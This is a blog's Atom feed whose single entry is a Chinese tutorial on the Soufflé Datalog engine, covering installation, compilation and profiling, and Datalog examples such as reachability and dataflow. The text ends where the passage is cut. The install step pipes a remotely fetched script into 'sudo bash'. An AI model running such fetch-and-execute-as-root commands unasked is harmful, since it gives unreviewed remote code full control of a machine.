<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jckling&#39;s Blog</title>
  
  
  <link href="https://jckling.github.io/atom.xml" rel="self"/>
  
  <link href="https://jckling.github.io/"/>
  <updated>2021-11-23T14:04:58.781Z</updated>
  <id>https://jckling.github.io/</id>
  
  <author>
    <name>Jckling</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Datalog 引擎 Soufflé 指南</title>
    <link href="https://jckling.github.io/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/"/>
    <id>https://jckling.github.io/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/</id>
    <published>2021-11-22T11:01:43.000Z</published>
    <updated>2021-11-23T14:04:58.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间看 Doop 顺手整理了篇 <a href="https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/">LogiQL 入门</a>，现在整理一下 Soufflé 的使用记录。Soufflé 是一款开源的 Datalog 引擎，相对 LogixBlox 更新更快（至少有论文这么总结），而 Doop 默认使用和维护了一整套 Soufflé 的规则。因为是开源引擎，所以有相关工作直接对 Doop 和 Soufflé 进行修改，用于实现一些分析，然后发了顶会😇😇😇</p><p>相关资料真的是少，不然就是难读，反正花时间看呗（摊手），最终目的是看懂 Doop 中的规则。</p><h1 id="安装-Souffle"><a href="#安装-Souffle" class="headerlink" title="安装 Soufflé"></a>安装 Soufflé</h1><p>实验使用 Ubuntu 20.04 进行，souffle、doop（java8）都可以成功安装和使用。</p><p>Soufflé 有一个解释器和一个编译器来执行 Datalog 程序，通过脚本安装。<em>PS：万一无法下载，可能是服务器问题（之前也宕机过）</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">curl -s https://packagecloud.io/install/repositories/souffle-lang/souffle/script.deb.sh | sudo bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">sudo apt install souffle -y</span><br></pre></td></tr></table></figure><h1 id="使用-Souffle"><a href="#使用-Souffle" class="headerlink" title="使用 Soufflé"></a>使用 Soufflé</h1><h2 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h2><p>example.dl 定义“边”和“路径”</p><ul><li><code>edge</code> 是一个 <code>.input</code> 关系，将从磁盘读取</li><li><code>path</code> 是一个 <code>.output</code> 关系，将被写入磁盘</li><li>如果有一条从 x 到 y 的边，那么就有一条从 x 到 y 的路径</li><li>如果有一条从 x 到 z 的路径，并且从 z 到 y 有一条边，那么就有一条从 x 到 y 的路径</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.decl edge(x:number, y:number)  // 声明</span><br><span class="line">.input edge     // 没有指定文件，默认从 edge.facts 中读取</span><br><span class="line"></span><br><span class="line">.decl path(x:number, y:number)  // 声明</span><br><span class="line">.output path    // 输出为 path.csv</span><br><span class="line"></span><br><span class="line">// 定义，注意末尾的 . 符号</span><br><span class="line">path(x, y) :- edge(x, y).</span><br><span class="line">path(x, y) :- path(x, z), edge(z, y).</span><br></pre></td></tr></table></figure><p>如果输入的 <code>edge</code> 关系是图中的顶点对，根据上面的两个规则，输出的路径关系将提供所有顶点对 x 和 y，即图中存在 x 到 y 的路径。</p><p>输入文件 edge.facts，使用制表符分隔：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">2 3</span><br></pre></td></tr></table></figure><p>执行分析，<code>-F</code> 表示输入文件路径，<code>-D</code> 表示输出文件路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. example.dl</span><br><span class="line"><span class="comment"># souffle -F./input -D./output example.dl</span></span><br></pre></td></tr></table></figure><p>查看输出文件 path.csv，包含所有存在路径的顶点对：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">12</span><br><span class="line">23</span><br><span class="line">13</span><br></pre></td></tr></table></figure><p>上面运行的是 <strong>解释器模式</strong>，Soufflé 还支持 <strong>编译器模式</strong>，将 Datalog 程序转换为 C++ 程序，然后编译生成可执行文件，使用 <code>-o</code> 参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成可执行文件</span></span><br><span class="line">souffle -F. -D. -oexample example.dl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行分析</span></span><br><span class="line">./example -F. -D. example.dl</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/22/BIYwt49Tdufm8gU.png"></p><p><code>-r</code> 参数用于调试，生成 HTML 格式的调试报告 <a href="https://github.com/jckling/Assets/blob/master/others/example.html">example.html</a>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. -rexample.html example.dl</span><br></pre></td></tr></table></figure><p><code>-p</code> 参数用于分析，以下命令将创建一个包含分析信息的日志文件 <a href="https://github.com/jckling/Assets/blob/master/others/example.log">example.log</a>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. -pexample.log example.dl</span><br></pre></td></tr></table></figure><p>souffle 还提供了一个命令行工具 <code>souffleprof</code>，可用于分析 example.log：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffleprof example.log</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/22/k5K69OytM8igDXB.jpg"></p><h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p>Datalog 是一种（声明式）基于逻辑的查询语言，允许用户执行递归查询。Datalog 语法的规范没有统一的标准，通常采用 Prolog 风格的语法。Soufflé 的语法受到 Datalog 实现的启发，即 Z3 中的 bddbddb(BDD-Based Deductive DataBase) 和 muZ。</p><p>Soufflé 为大规模面向逻辑的编程提供了软件工程功能（例如组件），对于实际使用，Soufflé 通过算术函子（arithmetic functors）扩展了 Datalog 使其图灵等价，让程序员能够编写非终止的程序。</p><ul><li>非终止的一个例子是事实 A(0) 和规则 A(i + 1) :- A(i)，没有额外的约束</li><li>这导致 Soufflé 尝试输出无限数量的关系 A(n)，其中 n &gt;= 0</li><li>这在某种程度上类似于 C 等命令式编程语言中的无限 while 循环。但是，算术函子提供的表达能力增强非常方便编程。</li></ul><h3 id="传递闭包"><a href="#传递闭包" class="headerlink" title="传递闭包"></a>传递闭包</h3><p>集合 X 上的关系 R 是可传递的，如果对于 X 中的所有 x、y、z，当 <code>x R y</code> 且 <code>y R z</code> 则 <code>x R z</code>。下面的示例表示有向图，其中边定义关系，如果元组满足以下两个规则中的任何一个，则元组处于传递闭包（可达关系）中。</p><ul><li>实际上，edge 中的所有元素都是可达的（根据基本规则），归纳规则捕获了传递属性，包括像 <code>reachable(&quot;a&quot;, &quot;d&quot;)</code> 这样的元组。</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.decl edge(n: symbol, m: symbol)</span><br><span class="line">edge(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>). <span class="comment">/* facts of edge */</span></span><br><span class="line">edge(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>).</span><br><span class="line">edge(<span class="string">&quot;c&quot;</span>, <span class="string">&quot;b&quot;</span>).</span><br><span class="line">edge(<span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>).</span><br><span class="line"></span><br><span class="line">.decl reachable (n: symbol, m: symbol)</span><br><span class="line"></span><br><span class="line">.output reachable // output relation reachable</span><br><span class="line"></span><br><span class="line">reachable(x, y):- edge(x, y). // base rule</span><br><span class="line">reachable(x, z):- edge(x, y), reachable(y, z). // inductive rule</span><br></pre></td></tr></table></figure><h3 id="同代"><a href="#同代" class="headerlink" title="同代"></a>同代</h3><p>给定一棵树（具有特定根节点的有向无环图），目标是找到哪些节点处于同一级别。</p><ul><li>下图中节点 b 和 c 处于同一级别，节点 e 和 g 也处于同一级别。</li></ul><p><img src="https://souffle-lang.github.io/img/same_generation_graph.jpg"></p><p>定义 Parent 关系，然后描述这棵树；定义 Person 关系和 SameGeneration 关系</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Parent</span>(n: symbol, m: symbol)  // 子代，父代</span><br><span class="line"><span class="symbol">Parent</span>(<span class="string">&quot;d&quot;</span>, <span class="string">&quot;b&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;b&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;f&quot;</span>,<span class="string">&quot;c&quot;</span>).</span><br><span class="line"><span class="symbol">Parent</span>(<span class="string">&quot;g&quot;</span>, <span class="string">&quot;c&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;a&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;c&quot;</span>,<span class="string">&quot;a&quot;</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Person</span>(n: symbol)</span><br><span class="line"><span class="symbol">Person</span>(x) :- <span class="symbol">Parent</span>(x, <span class="symbol">_</span>).  // 子代</span><br><span class="line"><span class="symbol">Person</span>(x) :- <span class="symbol">Parent</span>(<span class="symbol">_</span>, x).  // 父代</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">SameGeneration</span> (n: symbol, m: symbol)</span><br><span class="line"><span class="symbol">SameGeneration</span>(x, x):- <span class="symbol">Person</span>(x).   // 自己和自己是同代</span><br><span class="line"><span class="symbol">SameGeneration</span>(x, y):- <span class="symbol">Parent</span>(x,p), <span class="symbol">SameGeneration</span>(p,q), <span class="symbol">Parent</span>(y,q).   // 父代相等时，子代是同代</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">SameGeneration</span></span><br></pre></td></tr></table></figure><h3 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h3><p>数据流分析（Data-flow analysis, DFA）旨在确定程序的静态属性，基于控制流图（Call Flow Graphs, CFG），根据节点和图的属性进行程序分析。</p><p>一个例子是可达性定义（reaching definition）：变量的定义是否到达程序中特定的点。因为变量的赋值可以直接影响程序中另一点的值，这里考虑变量 v 的明确定义 d：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d: v &#x3D; &lt;expression&gt;;</span><br></pre></td></tr></table></figure><p>如果从 d 到 u 的所有路径都不包含 v 的任何明确定义，则变量 v 的定义 d 被认为可到达语句 u。注意即使没有明确的定义，函数也可能对变量产生副作用。</p><p>考虑以下控制流图，包含变量 v 的明确定义 d1 和 d2，只有 d2 定义的 v 能达到 B3。</p><p><img src="https://souffle-lang.github.io/img/reaching_definition.jpg"></p><p>以下代码输出 CFG 的所有阶段，其中 v 可能被这些定义之一捕获。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// define control flow graph</span><br><span class="line">// via the <span class="symbol">Edge</span> relation</span><br><span class="line">.decl <span class="symbol">Edge</span>(n: symbol, m: symbol)    // 边 n -&gt; m</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;start&quot;</span>, <span class="string">&quot;b1&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b1&quot;</span>, <span class="string">&quot;b2&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b1&quot;</span>, <span class="string">&quot;b3&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b2&quot;</span>, <span class="string">&quot;b4&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b3&quot;</span>, <span class="string">&quot;b4&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;b1&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;end&quot;</span>).</span><br><span class="line"></span><br><span class="line">// <span class="symbol">Generating</span> <span class="symbol">Definitions</span></span><br><span class="line">.decl <span class="symbol">GenDef</span>(n: symbol, d:symbol)   // 生成定义 n -&gt; d</span><br><span class="line"><span class="symbol">GenDef</span>(<span class="string">&quot;b2&quot;</span>, <span class="string">&quot;d1&quot;</span>).</span><br><span class="line"><span class="symbol">GenDef</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;d2&quot;</span>).</span><br><span class="line"></span><br><span class="line">// <span class="symbol">Killing</span> <span class="symbol">Definitions</span></span><br><span class="line">.decl <span class="symbol">KillDef</span>(n: symbol, d:symbol)  // 销毁定义 n -&gt; d</span><br><span class="line"><span class="symbol">KillDef</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;d1&quot;</span>).</span><br><span class="line"><span class="symbol">KillDef</span>(<span class="string">&quot;b2&quot;</span>, <span class="string">&quot;d2&quot;</span>).</span><br><span class="line"></span><br><span class="line">// <span class="symbol">Reachable</span></span><br><span class="line">.decl <span class="symbol">Reachable</span>(n: symbol, d:symbol)    // 可达定义</span><br><span class="line"><span class="symbol">Reachable</span>(u,d) :- <span class="symbol">GenDef</span>(u,d).  //生成点必定可达</span><br><span class="line"><span class="symbol">Reachable</span>(v,d) :- <span class="symbol">Edge</span>(u,v), <span class="symbol">Reachable</span>(u,d), !<span class="symbol">KillDef</span>(u,d). // 边uv，u 点可达且没有销毁定义 d，则 d 可达 v</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">Reachable</span></span><br></pre></td></tr></table></figure><h3 id="关于输入和-C-预处理器的备注"><a href="#关于输入和-C-预处理器的备注" class="headerlink" title="关于输入和 C 预处理器的备注"></a>关于输入和 C 预处理器的备注</h3><p>与 C++ 一样，Soufflé 使用两种类型的注释：</p><ul><li>类型 1：<code>// 这是备注</code></li><li>类型 2：<code>/* 这也是备注 */</code></li></ul><p>C 预处理器处理来自 Soufflé 的输入（即可以使用宏），例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;myprog.dl&quot;</span><br><span class="line">#define MYPLUS(a,b) (a+b)</span><br></pre></td></tr></table></figure><h2 id="例2：关系"><a href="#例2：关系" class="headerlink" title="例2：关系"></a>例2：关系</h2><h3 id="关系定义"><a href="#关系定义" class="headerlink" title="关系定义"></a>关系定义</h3><p>关系必须声明后才能使用，在 Soufflé 代码中编写代码行的顺序不会影响程序的正确性。使用两个字段 a 和 b 声明关系 <code>edge</code>，每个字段都是符号（字符串）。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.decl edge(a:symbol, b:symbol)</span><br></pre></td></tr></table></figure><h3 id="I-O-指令"><a href="#I-O-指令" class="headerlink" title="I/O 指令"></a>I/O 指令</h3><p>用户可以指定用于加载输入和将输出写入文件的指令：</p><ul><li>输入指令 <code>.input &lt;relation-name&gt;</code> 从 <code>&lt;relation-name&gt;.facts</code> 读取，默认情况下由制表符分隔</li><li>输出指令 <code>.output &lt;relation-name&gt;</code> 写入文件，通常是 <code>&lt;relation-name&gt;.csv</code>（默认）或 stdout（取决于选项）</li><li>打印关系大小指令 <code>.printsize &lt;relation-name&gt;</code> 将给定关系的基数（cardinality）打印到标准输出。</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(n: symbol)</span><br><span class="line">.input <span class="symbol">A</span> // facts are read from file <span class="symbol">A</span>.facts</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">B</span>(n: symbol)</span><br><span class="line"><span class="symbol">B</span>(n) :- <span class="symbol">A</span>(n).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">C</span>(n: symbol)</span><br><span class="line">.output <span class="symbol">C</span> // output appears in <span class="symbol">C</span>.csv</span><br><span class="line"><span class="symbol">C</span>(n) :- <span class="symbol">B</span>(n).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">D</span>(n: symbol)</span><br><span class="line">.printsize <span class="symbol">D</span> // the number of facts in <span class="symbol">D</span> is printed</span><br><span class="line"><span class="symbol">D</span>(n) :- <span class="symbol">C</span>(n).</span><br></pre></td></tr></table></figure><p>关系可以从以下文件加载或写入以下文件：</p><ul><li>任意 CSV 文件</li><li>压缩的文本文件</li><li>SQLite3 数据库</li></ul><p>例如，要将评估后的关系存储到 SQLite3 数据库中，用户可以指定如下内容：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(a:number, b:number)</span><br><span class="line">.output <span class="symbol">A</span>(<span class="symbol">IO</span>=sqlite, dbname=<span class="string">&quot;path/to/sqlite3db&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>Datalog 中的目标是形式为 <code>false &lt;= p</code> 的逻辑关系，其中 <code>p</code> 是逻辑关系。在 Soufflé 中目标是由输出指令模拟的，优点是可以在一次 Soufflé 程序的执行中评估多个独立的目标。</p><h3 id="语法便利"><a href="#语法便利" class="headerlink" title="语法便利"></a>语法便利</h3><p>可以编写具有多个头的规则，这是一种语法糖，可以最大限度地减少编码工作。下面是一个利用此功能的代码片段以及未应用转换的等效代码：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// <span class="symbol">Multiple</span> heads</span><br><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>). <span class="symbol">A</span>(<span class="number">2</span>). <span class="symbol">A</span>(<span class="number">3</span>).</span><br><span class="line">.decl <span class="symbol">B</span>(x:number)</span><br><span class="line">.decl <span class="symbol">C</span>(x:number)</span><br><span class="line"><span class="symbol">B</span>(x), <span class="symbol">C</span>(x) :- <span class="symbol">A</span>(x).     // 同时定义</span><br><span class="line">.output <span class="symbol">B</span>,<span class="symbol">C</span></span><br><span class="line"></span><br><span class="line">// <span class="symbol">Single</span> head</span><br><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>). <span class="symbol">A</span>(<span class="number">2</span>). <span class="symbol">A</span>(<span class="number">3</span>).</span><br><span class="line">.decl <span class="symbol">B</span>(x:number)</span><br><span class="line"><span class="symbol">B</span>(x) :- <span class="symbol">A</span>(x).</span><br><span class="line">.decl <span class="symbol">C</span>(x:number)</span><br><span class="line"><span class="symbol">C</span>(x) :- <span class="symbol">A</span>(x).</span><br><span class="line">.output <span class="symbol">B</span>,<span class="symbol">C</span></span><br></pre></td></tr></table></figure><p>类似地，规则体中的析取（disjunctions）也可以作为语法糖，例如：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// <span class="symbol">Disjunction</span> in rule bodies</span><br><span class="line">.decl edge(x:number, y:number)</span><br><span class="line">edge(<span class="number">1</span>,<span class="number">2</span>). edge(<span class="number">2</span>,<span class="number">3</span>).</span><br><span class="line">.decl path(x:number, y:number)</span><br><span class="line">path(x,y) :-</span><br><span class="line">  edge(x,y);        // 或</span><br><span class="line">  edge(x,q), path(q,y).</span><br><span class="line">.output path</span><br><span class="line"></span><br><span class="line">// <span class="symbol">No</span> disjunction in rule bodies</span><br><span class="line">.decl edge(x:number, y:number)</span><br><span class="line">edge(<span class="number">1</span>,<span class="number">2</span>). edge(<span class="number">2</span>,<span class="number">3</span>).</span><br><span class="line">.decl path(x:number, y:number)</span><br><span class="line">path(x,y) :- edge(x,y).</span><br><span class="line">path(x,y) :- edge(x,q), path(q,y).</span><br></pre></td></tr></table></figure><h2 id="例3：属性的类型系统"><a href="#例3：属性的类型系统" class="headerlink" title="例3：属性的类型系统"></a>例3：属性的类型系统</h2><p>Soufflé 的类型系统是静态的，就像 C 之类的语言一样，而与 Python 之类的语言不同。必须在编译（或解释）之前定义关系的属性，并在编译时检查类型。让程序员清楚地了解关系的定义及其用法，在运行时不进行动态检查能够最大限度地减少评估时间。</p><h3 id="原子类型"><a href="#原子类型" class="headerlink" title="原子类型"></a>原子类型</h3><p>Soufflé 有两种基本类型，符号类型 <code>symbol</code> 和数字类型 <code>number</code>。符号类型包含所有字符串，在内部由一个序数（ordinal number）表示。值 <code>ord(&quot;hello&quot;)</code> 对应于给定程序的这个序数，在这种情况下是字符串 “hello”。数字类型包括所有数字的全域。</p><h2 id="例4：算术表达式"><a href="#例4：算术表达式" class="headerlink" title="例4：算术表达式"></a>例4：算术表达式</h2><p>Soufflé 允许算术函子，扩展了传统的 Datalog 语义，函子中的变量可能不包含任何自由变量。一个简单的例子，最后一行连接中的第二个条件调用了算术运算符 <code>&lt;</code>：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(n: number)</span><br><span class="line">.output <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>).</span><br><span class="line"><span class="symbol">A</span>(x+<span class="number">1</span>) :- <span class="symbol">A</span>(x), x &lt; <span class="number">9.</span>  // 当 x 小于 <span class="number">9</span> 时</span><br></pre></td></tr></table></figure><p>打印斐波那契数列：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Fib</span>(i:number, a:number)</span><br><span class="line">.output <span class="symbol">Fib</span></span><br><span class="line"><span class="symbol">Fib</span>(<span class="number">1</span>, <span class="number">1</span>).</span><br><span class="line"><span class="symbol">Fib</span>(<span class="number">2</span>, <span class="number">1</span>).</span><br><span class="line"><span class="symbol">Fib</span>(i + <span class="number">1</span>, a + b) :- <span class="symbol">Fib</span>(i, a), <span class="symbol">Fib</span>(i<span class="number">-1</span>, b), i &lt; <span class="number">10.</span></span><br></pre></td></tr></table></figure><p>Soufflé 中允许使用以下算术函子：</p><ul><li>加法：<code>x + y</code></li><li>减法：<code>x - y</code></li><li>除法：<code>x / y</code></li><li>乘法：<code>x * y</code></li><li>模数：<code>a % b</code></li><li>幂：<code>a ^ b</code></li><li>计数器：<code>autoinc()</code></li><li>位操作：<code>x band y</code>、<code>x bor y</code>、<code>x bxor y</code> 和 <code>bnot x</code></li><li>逻辑运算：<code>x land y</code>、<code>x lor y</code> 和 <code>lnot x</code></li></ul><p>Soufflé 中允许以下算术约束：</p><ul><li>小于：<code>a &lt; b</code></li><li>小于或等于：<code>a &lt;= b</code></li><li>等于：<code>a = b</code></li><li>不等于：<code>a != b</code></li><li>大于或等于：<code>a &gt;= b</code></li><li>大于：<code>a &gt; b</code></li></ul><p>在源码中，数字可以写成十进制、二进制和十六进制：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">4711</span>).</span><br><span class="line"><span class="symbol">A</span>(<span class="number">0</span>b101).</span><br><span class="line"><span class="symbol">A</span>(<span class="number">0xaffe</span>).</span><br></pre></td></tr></table></figure><h3 id="数字编码"><a href="#数字编码" class="headerlink" title="数字编码"></a>数字编码</h3><p>数字可以用作逻辑值，如在 C 中：</p><ul><li><code>0</code> 代表假</li><li><code>!= 0</code> 代表真</li></ul><p>因此，它们可用于逻辑运算 <code>xland y</code>、<code>x lor y</code> 和 <code>lnot x</code>：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line">.output <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">0</span> lor <span class="number">1</span>).</span><br></pre></td></tr></table></figure><h3 id="函子-autoinc"><a href="#函子-autoinc" class="headerlink" title="函子 autoinc()"></a>函子 autoinc()</h3><p>函子 <code>autoinc()</code> 在每次求值时都会产生一个新数字，但是不允许在递归关系中使用。可用于为符号创建唯一编号（充当标识符），例如：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x: symbol)</span><br><span class="line"><span class="symbol">A</span>(“a”). <span class="symbol">A</span>(“b”). <span class="symbol">A</span>(“c”). <span class="symbol">A</span>(“d”).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">B</span>(x: symbol, y: number)</span><br><span class="line">.output <span class="symbol">B</span></span><br><span class="line"><span class="symbol">B</span>(x, autoinc()) :- <span class="symbol">A</span>(x).    // 为 a、b、c、d 各生成一个标识符</span><br></pre></td></tr></table></figure><p>给定一个集合 <code>A(x:symbol)</code>，创建一个后继关系 <code>Succ(x:symbol, y:symbol)</code> 使得第一个参数包含 A 中的元素 x，第二个参数包含 x 的后继，这也是一个 A 的元素。<br>例如，集合 <code>A = &#123;&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;&#125;</code> 具有后继关系 <code>Succ=((&quot;a&quot;, &quot;b&quot;), (&quot;b&quot;, &quot;c&quot;), (&quot;c&quot;, &quot;d&quot;)&#125;</code>。假设一个元素（在这种情况下是一个符号）的总顺序根据它的序数计算，内部表示为一个数字。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:symbol) input         // 集合</span><br><span class="line">.decl <span class="symbol">Less</span>(x:symbol, y:symbol)</span><br><span class="line"><span class="symbol">Less</span>(x,y) :- <span class="symbol">A</span>(x), <span class="symbol">A</span>(y), ord(x) &lt; ord(y).   // 排序关系：x &lt; y</span><br><span class="line"></span><br><span class="line">.decl <span 